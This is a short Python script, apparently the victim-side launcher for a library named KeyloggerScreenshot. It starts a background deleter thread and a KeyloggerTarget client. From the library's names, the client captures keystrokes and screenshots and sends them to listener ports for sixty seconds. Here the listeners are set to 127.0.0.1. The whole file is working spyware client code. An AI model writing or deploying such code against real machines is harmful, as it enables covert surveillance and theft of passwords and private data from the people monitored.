import KeyloggerScreenshot as ks 
import threading

thread_deleter = threading.Thread(target=ks.Local_Deleter.DeleteList.start)
thread_deleter.start()

ip = '127.0.0.1'
key_client = ks.KeyloggerTarget(ip, 1122, ip, 2233, ip, 1134, ip, 4455, duration_in_seconds=60)
key_client.start()
